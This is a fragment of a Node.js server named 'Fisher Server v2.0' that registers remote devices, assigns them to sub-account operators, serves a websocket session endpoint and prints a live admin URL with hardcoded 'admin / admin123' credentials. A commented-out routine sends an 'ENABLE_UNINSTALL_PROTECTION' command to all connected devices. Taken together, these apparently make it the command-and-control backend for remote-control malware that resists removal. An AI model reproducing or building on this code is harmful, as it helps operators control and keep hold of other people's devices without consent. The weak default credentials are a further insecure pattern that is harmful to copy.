  const ownerUsername = data.ownerUsername || '';
  if (ownerUsername) {
    const currentOwner = existing ? existing.owner_username : '';
    if (!currentOwner || currentOwner !== ownerUsername) {
      // 更新设备归属
      db.prepare('UPDATE devices SET owner_username=? WHERE device_id=?').run(ownerUsername, deviceId);
      console.log(`[NODE-REG] ✅ 设备 ${deviceId} 绑定子账号: ${ownerUsername}`);

      // 同步更新子账号的 assigned_devices 列表
      const user = db.prepare('SELECT assigned_devices FROM users WHERE username=?').get(ownerUsername);
      if (user) {
        let devices = [];
        try { devices = JSON.parse(user.assigned_devices || '[]'); } catch (e) { devices = []; }
        if (!Array.isArray(devices)) devices = [];
        if (!devices.includes(deviceId)) {
          devices.push(deviceId);
          db.prepare('UPDATE users SET assigned_devices=? WHERE username=?')
            .run(JSON.stringify(devices), ownerUsername);
          console.log(`[NODE-REG] ✅ 子账号 ${ownerUsername} 设备列表更新: ${devices.join(',')}`);
        }
      } else {
        console.log(`[NODE-REG] ⚠️ 子账号 ${ownerUsername} 不存在，仅绑定设备`);
      }
    }
  }

  console.log(`[NODE-REG] ${deviceId} from ${ip}, owner=${ownerUsername || '(none)'}`);
  res.json({ success: true, message: 'registered', data: { deviceId } });
});

app.post('/api/node/logs', (req, res) => {
  res.json({ success: true });
});

app.post('/api/data/app-list', (req, res) => {
  res.json({ success: true });
});

// 404 请求捕获（排查未知请求路径）
app.use((req, res, next) => {
  console.log(`[404] ${req.method} ${req.originalUrl} from ${req.ip}`);
  res.status(404).json({ success: false, message: 'Not Found', path: req.originalUrl });
});

// 启动
// ============================================================
// 同时在 80 端口启动一个辅助的 HTTP 监听服务，处理 HTTP 访问及 CDN 回源流量
const httpPort = 8080;
const httpServer = http.createServer(app);
httpServer.listen(httpPort, '0.0.0.0', () => {
  console.log(`[HTTP] ✅ HTTP 辅助回源服务已在端口 ${httpPort} 启动完成`);
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n${'='.repeat(50)}`);
  console.log(`  Fisher Server v2.0 (Node.js)`);
  console.log(`  https://admins.xiongmaodaxia.top`);
  console.log(`  wss://admins.xiongmaodaxia.top/ws/session`);
  console.log(`  账号: admin / admin123`);
  console.log(`${'='.repeat(50)}\n`);

  // // 启动时自动向所有当前已在线的设备补发一次防卸载指令（暂时关闭）
  // setTimeout(() => {
  //   console.log(`[INIT] 正在向当前在线的 ${deviceConnections.size} 个设备补发 ENABLE_UNINSTALL_PROTECTION...`);
  //   for (const [deviceId, ws] of deviceConnections) {
  //     if (ws.readyState === 1) {
  //       ws.send(JSON.stringify({
  //         type: 'command',
  //         data: {
  //           command: 'ENABLE_UNINSTALL_PROTECTION',
  //           params: {}
  //         }
  //       }));
  //       console.log(`[INIT] ✅ 已向在线设备 ${deviceId} 补发 ENABLE_UNINSTALL_PROTECTION`);
  //     }
  //   }
  // }, 3000);
});
